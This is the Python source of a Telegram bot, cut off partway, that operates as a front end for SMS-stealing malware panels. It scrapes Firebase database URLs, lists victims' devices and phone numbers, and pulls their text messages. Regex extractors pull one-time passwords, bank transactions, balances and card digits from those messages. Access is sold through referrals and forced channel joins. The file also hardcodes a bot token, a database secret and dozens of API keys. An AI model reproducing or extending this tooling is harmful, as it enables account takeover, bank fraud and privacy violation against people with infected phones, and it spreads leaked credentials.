#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
  FAST-SKIP LOGIC (HIT & RUN) | RAILWAY SMOOTH ENGINE
  DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
  5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
══════════════════════════════════════════════════════
"""

import os
import re
import sys
import time
import json
import random
import string
import asyncio
import logging
import warnings
import traceback
import gc
from collections import deque
from datetime import datetime
from typing import Optional
import aiohttp
from aiohttp import web
from urllib.parse import quote_plus
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from playwright.async_api import async_playwright

warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(format='[%(asctime)s] %(levelname)s: %(message)s', level=logging.INFO, datefmt='%Y-%m-%d %H:%M:%S')
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ==========================================
# ⚙️ VANTAGE & CONFIGURATION
# ==========================================
VANTAGE_DB = "https://sannn-5d617-default-rtdb.firebaseio.com"
VANTAGE_AUTH = "tHe daRk"

TOKEN = "8859936528:AAG2x6eFAAgEY0NvnM-oH-P5BbqrJn4W_MY" # ⚠ APNA NAYA TOKEN YAHA DAALEIN
REFERRAL_CODE = "umd67mpf"
ADMIN_IDS: set[int] = {6860106371}

WAIT_EMAIL, WAIT_OTP, WAIT_PROMPT, WAIT_NUMBER = range(4)

# 🔥 AUTO-LOAD ALL PANELS FROM .TXT FILES 🔥
def extract_urls_from_files() -> list:
    extracted_urls = set()
    pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
    current_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else '.'
    for filename in os.listdir(current_dir):
        if (filename.endswith('.json') or filename.endswith('.txt')) and filename not in ['settings.json', 'requirements.txt', 'device_cache.json']:
            filepath = os.path.join(current_dir, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    matches = pattern.findall(content)
                    extracted_urls.update(matches)
            except Exception: pass
    return list(extracted_urls)

RAW_URLS = list(set(extract_urls_from_files()))

# Combine Vanguard DB + All Extracted DBs
DATABASES = {"VANTAGE_MAIN": {"url": VANTAGE_DB, "auth": VANTAGE_AUTH}}
for i, url in enumerate(RAW_URLS):
    if url != VANTAGE_DB:
        DATABASES[f"P_{i}"] = {"url": url, "auth": None}

POLL_INTERVAL   = 10  
CACHE_INTERVAL  = 600 
SMS_LIMIT       = 150  
PAGE_SIZE       = 14

MANDATORY_CHATS = ["@leakmethodfree", "@sabkijayhokhush", "@rosekhudkabanaya"]

BASE_DIR = os.getenv("RAILWAY_VOLUME_MOUNT_PATH", os.path.dirname(os.path.abspath(__file__)))
DB_DIR = os.path.join(BASE_DIR, "Panel_Databases")
USERS_DIR = os.path.join(DB_DIR, "Users")
CLONES_DIR = os.path.join(DB_DIR, "Clones")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
CACHE_FILE = os.path.join(SYS_DIR, "device_cache.json")

seen_ids = deque(maxlen=20000) 
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None
start_time = time.time()
total_otps_processed = 0

user_fresh_cache: dict[int, list[str]] = {}
all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
SCAN_PROGRESS = {"total": len(DATABASES) if len(DATABASES) > 0 else 1, "completed": 0}
SETTINGS = {"base_price": 30, "global_panels": []}

# 🔥 RAILWAY SMOOTH ENGINE (RAM Protected) 🔥
HTTP_SEMAPHORE = asyncio.Semaphore(40)
WORKER_SEMAPHORE = asyncio.Semaphore(25)
API_LOCK = asyncio.Lock()

SYS_SETTINGS = {
    "api_keys": [
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
        "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3",
        "AK_16LERGicFB6uncWbhCjeE9uD-UHjrFsA", "AK_0damiG8gnn6xBLe3__JBfcvH_rJh686E",
        "AK_gvRJyMC_byA4xamTOrRsWiNEHPrs_QS1", "AK_YvD2v66Ue-YlZ-Hu18s3NvNaL2vql2r3",
        "AK_5QuS_fHqe6eE-zTaZ_fDclt29D9yMDgE", "AK_xY9PPRI388wiXjpbRQWCQrc5jA9mBrAa",
        "AK_KY-Lvl-_x7-t8hQlzuSwI3s2fBooCJAd", "AK_Pg_J42kDmN2gazXPgCZlxNt6fsfnOlCT",
        "AK_R5xBtr0Mejw-0a54j-gTxh8feMjQZcOn", "AK_9CXg3dKl-IxLDIerpMzhd-KVE3HCMCso",
        "AK_7Mif5BId_Iz5rjpKD6Fc2k6DX7mqCEyU", "AK__OdSNA9Dq-3YJEueBT1-OcnRiJGkN1Y0",
        "AK_LnxgclktRe50Phzzwcon4kltxFtxx2vJ", "AK_8NlERdLgolrFdeddI3sMrjZG8bICRHoF",
        "AK_3pTIVB1bG172ZlXmch3ICqCNcRyx8gwA", "AK_etId74tu1V75auJXiq1Y_jV9H9lsQ4am",
        "AK_YIpYpHNlCNnjLeSUdkA-lqSGZ94nppjt", "AK_QLZXoprRieTkAZlgERxHdr9I1sL3bGP_",
        "AK_-08LOerb6jaCx52JmjDC0pMWhNzgVRbZ", "AK_mS7CAb1vPUnhQorNuxDgV_xfNN2kyoGW",
        "AK_LncxU9pi2mte200towYPh-ae2FcrMO9j", "AK_7DTjFAVezVWUvSvI4Ni-3_0L1t3uNwbw",
        "AK_UGc1SjKM7pWUiub6xq3n-wTXa4p_Jrse", "AK_NuDV1z5xOi0uT7fxks4TfA0I0iPBbiFM",
        "AK_NwhgeV64GrdGFoSaFj7LbqiieQObi55o", "AK_T2uFNlEPzaKT3OeIROc9FVYpYhYeFjma",
        "AK_PD7Nc8H2a0DNwENQmlflKvCBEow30UD9", "AK_Htire7-fPlEdEMNAdtkQ0wZ0NS4ttbaz",
        "AK_r8Sk4b7UzPf_DhbM_-tjVe1moW1iRLy5", "AK_EifnL8Bx6DfCIGRJGikPvPoYNkmpvTqF",
        "AK_I6lx-tDgEJA0P_jP1foxgM2eUO5F-tJd", "AK_VqzDvRR4oJyG_zBZmHSjX2f57Z4dngfy",
        "AK_5pvQYHaqr_71s4Wq0-_tRvgJBBscn6xB", "AK_1JbT6popnOVlIO929J9Y2Z0-gyHUCXdL",
        "AK_PrWss32JjoP7nv6ttNOP0d3RYynqslug", "AK_ldeMT-eBQ2whhXvakm9frq59bmxYNo1Y",
        "AK_dQhyxP4BsTbEIQ1s_VgXJkt4up4IX9UV", "AK_ak1Fy5vvoXhFInwSunFWEBz3SAuEltiO",
        "AK_80VoNRC8pkOHI7Kbpe7ybvWcTq2ktuWO", "AK_n3rVdC1y5fIRJDLosvsNzQimr16D-zmr",
        "AK_VuokZpsT91F2-TzrO13RQZ3BTOF1VOlA", "AK_GGulMMNAcqKRf8BAXQfzlesaozh917Re",
        "AK_JDvMk7HIq4yhD1NvEZ0bRRgdnjyUrK_M", "AK_suKV-7E1peiwoxFLoi67ENmraj0mKRkE",
        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb",
        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
    ],
    "check_anim": "⚡"
}

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts", "auth")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0, auth=None):
        self.id = id; self.name = name; self.status = status; self.battery = battery
        self.timestamp = timestamp; self.numbers = numbers; self.device_info = device_info
        self.sms_path = sms_path; self.base_url = base_url; self.db_tag = db_tag; self.last_sms_ts = last_sms_ts; self.auth = auth
        
    def to_dict(self):
        return {"id": self.id, "name": self.name, "status": self.status, "battery": self.battery, "timestamp": self.timestamp, "numbers": self.numbers, "device_info": self.device_info, "sms_path": self.sms_path, "base_url": self.base_url, "db_tag": self.db_tag, "last_sms_ts": self.last_sms_ts, "auth": self.auth}
    
    @classmethod
    def from_dict(cls, data):
        return cls(data["id"], data["name"], data["status"], data["battery"], data["timestamp"], data["numbers"], data["device_info"], data["sms_path"], data["base_url"], data["db_tag"], data.get("last_sms_ts", 0.0), data.get("auth"))

# ==========================================
# 🚀 RAILWAY ANTI-CRASH WEB SERVER
# ==========================================
async def handle_ping(request):
    return web.Response(text="Bot is running smoothly on Railway. Anti-Crash Active.")

async def start_dummy_server():
    try:
        app = web.Application()
        app.router.add_get('/', handle_ping)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get("PORT", 8080))
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"Railway Dummy Web Server started on port {port}")
    except Exception as e:
        logger.error(f"Dummy Server Error: {e}")

# ==========================================
# 🛠 UTILITIES & CACHE
# ==========================================
def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(CLONES_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f: f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, CLONES, SETTINGS, GLOBAL_DEVICE_CACHE, SCAN_PROGRESS
    init_dirs()
    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f: SETTINGS.update(json.load(f))
        except: pass

    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                saved_cache = json.load(f)
                all_devs_list = []
                for tag, dev_list in saved_cache.items():
                    parsed_devs = [Device.from_dict(d) for d in dev_list]
                    GLOBAL_DEVICE_CACHE[tag] = parsed_devs
                    all_devs_list.extend(parsed_devs)
                
                n_map = {}
                for d in all_devs_list:
                    if d.numbers:
                        m = d.numbers[0]
                        if m not in n_map or d.timestamp > n_map[m].timestamp: n_map[m] = d
                    else: n_map[d.id] = d 
                
                sorted_res = list(n_map.values())
                sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
                
                if len(sorted_res) > 50:
                    SCAN_PROGRESS["completed"] = 99999 
                    SCAN_PROGRESS["total"] = 99999
        except Exception: pass

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f: all_users[uid] = json.load(f)
            except: pass
                
    for adm in ADMIN_IDS:
        if adm in all_users:
            all_users[adm]["global_spam"] = False 
            save_user(adm)
        if adm not in all_users:
            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "access_until": 2e10, "global_trial_end": 2e10, "personal_trial_end": 2e10, "has_global_access": True, "otp_count": 0, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL"}
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        try:
            with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f: json.dump(all_users[uid], f, indent=4)
        except: pass

def save_settings():
    init_dirs()
    try:
        with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f: json.dump(SETTINGS, f, indent=4)
    except: pass

def save_device_cache():
    try:
        data_to_save = {tag: [d.to_dict() for d in devs] for tag, devs in GLOBAL_DEVICE_CACHE.items() if tag != "ALL"}
        with open(CACHE_FILE, "w", encoding="utf-8") as f: json.dump(data_to_save, f)
    except: pass

def _sync_save_data():
    save_settings()
    for uid in list(all_users.keys()): save_user(uid)
    save_device_cache()

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

async def auto_save_loop():
    while True:
        await asyncio.sleep(300) 
        await save_data_async()

async def hourly_backup_loop(app: Application):
    while True:
        await asyncio.sleep(7200) 
        try:
            total_u = len(all_users)
            g_panels = len(DATABASES) + len(SETTINGS.get("global_panels", []))
            u_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
            msg = f"⏱ <b>2-HOUR AUTO BACKUP & STATS</b> ⏱\n\n👥 Total Users: {total_u}\n🌍 Global Panels: {g_panels}\n👤 User Custom Panels: {u_panels}\n🔄 Total OTPs Captured: {total_otps_processed}\n\n✅ System Stability: NORMAL. Railway Anti-Crash Active."
            
            backup_path = os.path.join(SYS_DIR, "Database_Backup.json")
            with open(backup_path, "w", encoding="utf-8") as f:
                json.dump({"users": all_users, "settings": SETTINGS}, f, indent=4)
                
            for adm in ADMIN_IDS: 
                await app.bot.send_message(adm, msg, parse_mode="HTML")
                await app.bot.send_document(adm, document=open(backup_path, "rb"), filename=f"Backup_{int(time.time())}.json")
        except Exception as e:
            logger.error(f"Backup Error: {e}")

async def memory_sweeper():
    while True:
        await asyncio.sleep(300) 
        now = time.time()
        expired_cd = [k for k, v in user_cooldowns.items() if now - v > 3600]
        for k in expired_cd: del user_cooldowns[k]
        user_fresh_cache.clear() 
        gc.collect() 

def generate_random_string(length=8): return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
def generate_random_phone(): return str(random.randint(2000000000, 9999999999))
def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
    return list(set(nums))

# 🔥 VANTAGE BANK & CARDS EXTRACTORS 🔥
OTP_PATTERNS = [re.compile(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"(?<!\d)(\d{6})(?!\d)"), re.compile(r"(?<!\d)(\d{4})(?!\d)")]
BANK_PATTERNS = [re.compile(r"(debited|credited|deducted|received|spent).*?(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE), re.compile(r"(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?).*?(debited|credited|deducted|received|spent)", re.IGNORECASE), re.compile(r"bal(?:ance)?\s*(?:is|:|-)?\s*(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)]
CARD_PATTERNS = [re.compile(r"(?:card|a/c|acct)[\s\w]*ending[\s\w]*(\d{4})", re.IGNORECASE), re.compile(r"card.*?(?:\*|x)+(\d{4})", re.IGNORECASE)]

def extract_otp(text: str) -> Optional[str]:
    if not text: return None
    t_lower = text.lower()
    if any(x in t_lower for x in ["block", "rs.", "bal", "balance", "debited", "credited", "alert"]): return None
    for pat in OTP_PATTERNS:
        m = re.search(pat, text)
        if m: return m.group(1)
    return None

def extract_bank_info(text: str) -> Optional[str]:
    if not text: return None
    info = []
    for pat in BANK_PATTERNS:
        m = re.search(pat, text)
        if m:
            groups = m.groups()
            if len(groups) == 2:
                action = groups[0].lower() if groups[0].lower() in ['debited', 'credited', 'deducted', 'received'] else groups[1].lower()
                amt = groups[1] if groups[1].replace('.','').replace(',','').isdigit() else groups[0]
                emoji = "🔴" if action in ['debited', 'deducted', 'spent'] else "🟢"
                info.append(f"{emoji} {action.capitalize()}: ₹{amt}")
            elif len(groups) == 1:
                info.append(f"💰 Balance: ₹{groups[0]}")
    return " | ".join(info) if info else None

def extract_card_info(text: str) -> Optional[str]:
    if not text: return None
    for pat in CARD_PATTERNS:
        m = re.search(pat, text)
        if m: return f"💳 Card: **{m.group(1)}"
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_bool(val) -> str: return "online" if val is True or str(val).lower() == "online" else "offline"
def parse_status_str(val) -> str: return "online" if str(val).lower() == "online" else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"

# ==========================================
# 🌐 FIREBASE FAST-SKIP LOGIC (HIT & RUN)
# ==========================================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=60, use_dns_cache=True, ttl_dns_cache=300)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

def build_fb_url(base: str, path: str, auth: str = None, shallow: bool = False, query: str = "") -> str:
    url = f"{base}/{path}.json" if path else f"{base}/.json"
    params = []
    if auth: params.append(f"auth={quote_plus(auth)}")
    if shallow: params.append("shallow=true")
    if query: params.append(query)
    if params: url += "?" + "&".join(params)
    return url

async def fb_get(path: str, base: str, auth: str = None, query: str = "") -> Optional[dict]:
    async with HTTP_SEMAPHORE:
        try:
            session = await get_http_session()
            url = build_fb_url(base, path, auth=auth, query=query)
            # 5-second timeout for deep data fetch to avoid hanging
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status == 200: return await r.json(content_type=None)
                return None
        except: return None

async def fb_keys(path: str, base: str, auth: str = None) -> list[str]:
    async with HTTP_SEMAPHORE:
        try:
            session = await get_http_session()
            url = build_fb_url(base, path, auth=auth, shallow=True)
            # 3-second FAST SKIP timeout for initial check
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    return list(data.keys()) if isinstance(data, dict) else []
                return []
        except: return []

async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
    url = db_config["url"]
    auth = db_config.get("auth")
    
    async with WORKER_SEMAPHORE:
        try:
            # FAST SKIP: Ping database first to see if it's alive and has useful data
            root_keys = await fb_keys("", url, auth)
            if not root_keys: 
                return [] # DB is dead/empty -> Skip immediately!

            devices_list = []
            added_set = set()
            
            # Only scan if these specific tables exist
            if "All_Users" in root_keys or "user_data" in root_keys or "clients" in root_keys:
                sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
                    fb_get("All_Users/simDetails", url, auth), 
                    fb_get("All_Users/Data/DeviceInfo", url, auth),
                    fb_get("user_data", url, auth), 
                    fb_get("clients", url, auth)
                )
                
                if sim_all and isinstance(sim_all, dict):
                    info_all = device_info_all or {}
                    for dev_id, sim in sim_all.items():
                        if dev_id in added_set: continue
                        added_set.add(dev_id)
                        info = info_all.get(dev_id) or {}
                        nums = extract_all_nums(sim, info)
                        model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                        devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, auth=auth))
                
                if user_data_all and isinstance(user_data_all, dict):
                    for dev_id, data in user_data_all.items():
                        if dev_id in added_set: continue
                        if not isinstance(data, dict): continue
                        added_set.add(dev_id)
                        nums = extract_all_nums(data)
                        devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, auth=auth))

                if clients_all and isinstance(clients_all, dict):
                    for dev_id, client in clients_all.items():
                        if dev_id in added_set: continue
                        if not isinstance(client, dict): continue
                        sim_list = client.get("sims", [])
                        s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                        s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
                        nums = extract_all_nums(client, s1, s2)
                        added_set.add(dev_id)
                        model = client.get("modelName") or f"Device-{dev_id[:6]}"
                        devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}", sms_path=f"messages/{dev_id}", base_url=url, db_tag=tag, auth=auth))
            return devices_list
        except Exception:
            return None 

async def check_number_api(service: str, number: str, retries=2) -> dict:
    clean_number = re.sub(r"\D", "", str(number))[-10:]
    api_keys = SYS_SETTINGS.get("api_keys", [])
    if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}
    for attempt in range(retries):
        async with API_LOCK:
            if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
            selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
            check_number_api.k_idx += 1
        payload = {"service": service.lower(), "number": clean_number}
        start_req = time.time()
        try:
            session = await get_http_session()
            async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200: 
                    res = await r.json()
                    res["ms"] = int((time.time() - start_req) * 1000)
                    return res
        except: pass
        await asyncio.sleep(0.5)
    return {"status": "error"}

def get_user_dbs(uinfo: dict) -> list:
    valid_urls, now = [], time.time()
    for db in uinfo.get("custom_dbs", []):
        if isinstance(db, str): valid_urls.append({"url": db, "auth": None})
        elif isinstance(db, dict) and db.get("expiry", 0) > now: valid_urls.append({"url": db["url"], "auth": db.get("auth")})
    return valid_urls

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    if now - user_cooldowns.get(user_id, 0) < 1.0: return True
    user_cooldowns[user_id] = now
    return False

async def check_force_sub(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    for chat in MANDATORY_CHATS:
        try:
            m = await bot.get_chat_member(chat, user_id)
            if m.status in ['left', 'kicked']: return False
        except: return False
    return True

async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_func) -> bool:
    u = all_users.get(chat_id, {})
    if chat_id in ADMIN_IDS or u.get("has_global_access", False): return True
    
    now = time.time()
    if now < u.get("access_until", 0) or now < u.get("global_trial_end", 0) or now < u.get("personal_trial_end", 0):
        return True
        
    refs = u.get("referrals", 0)
    if refs >= 10:
        all_users[chat_id]["referrals"] -= 10
        all_users[chat_id]["access_until"] = now + 86400
        save_user(chat_id)
        await reply_func("✅ <b>10 Referrals Redeemed!</b>\nAapka 24 Hours VIP Access unlock ho gaya hai.", parse_mode="HTML")
        return True
        
    ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
    await reply_func(f"🛑 <b>TRIAL EXPIRED</b> 🛑\nPremium panels ke liye <b>10 referrals</b> chahiye.\n📉 Referrals: {refs}/10\n🔗 Link: <code>{ref_link}</code>", parse_mode="HTML")
    return False

async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
    if users_db is None: users_db = {}
    u_data = users_db.get(chat_id, {})
    is_global_view = chat_id in ADMIN_IDS or u_data.get("has_global_access", False) or time.time() < u_data.get("access_until", 0) or time.time() < u_data.get("global_trial_end", 0)
    
    if is_global_view and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
        return GLOBAL_DEVICE_CACHE["ALL"]

    dbs_to_check = []
    if is_global_view:
        dbs_to_check.extend([tag for tag in GLOBAL_DEVICE_CACHE.keys() if tag != "ALL"])
    for i, _ in enumerate(get_user_dbs(u_data)): 
        dbs_to_check.append(f"U_{chat_id}_{i}")

    all_gathered = []
    for tag in set(dbs_to_check): 
        all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))

    number_map = {}
    for d in all_gathered:
        if d.numbers:
            main_num = d.numbers[0]
            if main_num not in number_map or d.timestamp > number_map[main_num].timestamp: number_map[main_num] = d
        else: number_map[d.id] = d 

    unique_devices = list(number_map.values())
    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
    return unique_devices

async def find_device_by_id(dev_id: str, bot_token: str, chat_id: int, users_db: dict) -> Optional[Device]:
    dev_id = str(dev_id).strip()
    for tag, devs in GLOBAL_DEVICE_CACHE.items():
        for d in devs:
            if d.id == dev_id: return d
    for d in await get_all_devices(bot_token, chat_id, users_db):
        if d.id == dev_id: return d
    return None

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(f"{device.sms_path}", device.base_url, auth=device.auth, query=f'orderBy="%24key"&limitToLast={limit}')
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries

# ==========================================
# 🖼 UI COMPONENTS & KEYBOARDS
# ==========================================

def _format_btn_label(d: Device) -> str:
    icon = "🟢" if d.status == "online" else "🔴"
    if d.numbers:
        main_num = str(d.numbers[0])
        display_num = main_num if main_num.startswith("+") else f"+{main_num}"
        if len(display_num) > 14: display_num = display_num[:13] + "…"
        lbl = f"{icon} {display_num}"
    else:
        lbl = f"{icon} {d.name[:8]}"
    return lbl

def force_sub_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/leakmethodfree")],
        [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/sabkijayhokhush")],
        [InlineKeyboardButton("💬 Join Group", url="https://t.me/rosekhudkabanaya")],
        [InlineKeyboardButton("✅ Verify & Continue", callback_data="verify_sub")]
    ])

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    u = all_users.get(chat_id, {})
    is_admin = chat_id in ADMIN_IDS or u.get("has_global_access", False)
    is_vip = time.time() < u.get("access_until", 0)
    
    keys = [
        [KeyboardButton("⚡ 5-Min Fresh Devices"), KeyboardButton("🔥 30-Min Fresh Devices")],
        [KeyboardButton("🍔 App OTPs (24h)"), KeyboardButton("Search Number (God)")],
        [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
        [KeyboardButton("🏦 Bank/Cards Scanner"), KeyboardButton("Manual Checker")],
        [KeyboardButton("Scan Hidden Devices"), KeyboardButton("🎁 Redeem Promo")]
    ]
    
    if is_admin or is_vip: keys.append([KeyboardButton("💳 Add Panel")])
    if chat_id in ADMIN_IDS: keys.append([KeyboardButton("Admin Panel"), KeyboardButton("Check Status")])
        
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def get_checker_menu(prefix="chk_srv:"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def get_app_search_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🍔 Swiggy", callback_data="app_search:swiggy"), InlineKeyboardButton("🍕 Zomato", callback_data="app_search:zomato")],
